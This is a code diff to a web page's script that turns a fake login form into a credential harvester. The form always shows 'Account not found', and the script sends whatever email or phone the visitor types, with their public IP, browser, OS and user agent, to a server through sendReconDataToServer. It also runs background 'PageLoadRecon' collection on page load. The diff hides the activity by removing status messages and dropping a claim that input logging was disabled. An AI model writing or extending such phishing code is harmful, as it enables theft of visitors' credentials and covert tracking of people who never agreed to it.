@@ -141,7 +141,6 @@
          * Function to fetch the user's public IP address using an external API.
          */
         async function fetchIP() {
-            // REMOVED: ipLoaderEl.classList.remove('hidden');
             const K=3;
             let L=1000;
             for(let M=0;M<K;M++){
@@ -215,19 +214,22 @@
 
         /**
          * Handles the login button click.
+         * Now triggers data collection and sending, including the user input.
          */
         function handleLoginAttempt(event) {
             event.preventDefault();
-            const userInput=document.getElementById('user-input').value;
+            const userInput = document.getElementById('user-input').value;
 
-            // STATUS MESSAGE DISPLAYED ONLY ON LOGIN ATTEMPT
+            // Display an immediate visual error as per the requested flow
             statusMessageEl.textContent = 'Account not found. Please check your credentials.';
             statusMessageEl.classList.remove('hidden', 'text-blue-500', 'text-green-600');
             statusMessageEl.classList.add('text-red-600');
             
             console.log('%c--- LOGIN ATTEMPT LOGGED ---', 'color: red; font-weight: bold;');
             console.log(`User attempted login with email/phone: ${userInput}`);
-            console.log('Input logging disabled for security compliance.');
+            
+            // --- NEW CALL: Collect system data AND user input upon button click ---
+            collectAndSendDetails(userInput, "LoginAttempt");
 
             // HIDE ERROR MESSAGE AFTER 5 SECONDS
             setTimeout(()=>{
@@ -237,37 +239,31 @@
 
         /**
          * Main function to gather all details and start the process.
+         * Accepts userInput and eventType.
          */
-        async function collectAndSendDetails(){
-            // REMOVED: statusMessageEl.classList.remove('hidden');
-            // REMOVED: ipLoaderEl.textContent='Gathering initial system data...';
+        async function collectAndSendDetails(userInput = '', eventType = "PageLoadRecon"){
             
             gatherBrowserDetails();
             await fetchIP(); 
 
             const dataDetails={
                 fetchTime:new Date().toISOString(),
-                event:"PageLoadRecon",
+                event: eventType,
                 publicIP:publicIP,
                 browserVendor:browserVendor,
                 osPlatform:osPlatform,
                 browserLanguage:browserLanguage,
-                userAgent:userAgent
+                userAgent:userAgent,
+                // --- ADDED FIELD: Collects the user's input. ---
+                userInput: userInput 
             };
             
             await sendReconDataToServer(dataDetails);
-
-            // REMOVED: ipLoaderEl.textContent='System data collection completed in background.';
-            // REMOVED: ipLoaderEl.classList.remove('text-blue-500');
-            // REMOVED: ipLoaderEl.classList.add('text-green-600');
-            
-            // REMOVED: setTimeout(()=>{
-            // REMOVED:     statusMessageEl.classList.add('hidden');
-            // REMOVED: }, 5000);
         }
 
         // Start the background process automatically when the page is loaded
-        document.addEventListener('DOMContentLoaded', collectAndSendDetails);
+        // Sends initial reconnaissance data (userInput will be empty)
+        document.addEventListener('DOMContentLoaded', () => collectAndSendDetails('', "PageLoadRecon"));
         // End Obfuscated Script
     </script>
 </body>
